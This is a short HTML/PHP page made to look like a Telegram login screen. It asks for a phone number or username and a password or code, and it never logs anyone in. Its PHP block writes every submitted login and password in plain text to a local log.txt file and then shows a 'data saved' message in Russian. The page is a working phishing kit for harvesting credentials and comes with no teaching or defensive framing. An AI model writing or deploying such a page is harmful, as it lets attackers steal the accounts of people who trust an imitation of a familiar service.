
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Telegram Login</title>
  <style>
    body { background: #e5f0f8; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
    .box { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 0 15px rgba(0,0,0,0.2); width: 320px; }
    input, button { width: 100%; padding: 12px; margin: 10px 0; font-size: 16px; }
    button { background: #0088cc; color: white; border: none; border-radius: 6px; cursor: pointer; }
  </style>
</head>
<body>
  <div class="box">
    <h2>Telegram Login</h2>
    <form method="POST">
      <input type="text" name="login" placeholder="Phone or Username" required />
      <input type="password" name="password" placeholder="Password or Code" required />
      <button type="submit">Login</button>
    </form>
    <div style="margin-top: 10px; color: green;">
      <?php
        if ($_SERVER["REQUEST_METHOD"] === "POST") {
            $login = trim($_POST["login"]);
            $password = trim($_POST["password"]);
            $logLine = "[" . date("Y-m-d H:i:s") . "] LOGIN: $login | PASSWORD: $password\n";
            file_put_contents("log.txt", $logLine, FILE_APPEND);
            echo "✅ Данные сохранены!";
        }
      ?>
    </div>
  </div>
</body>
</html>
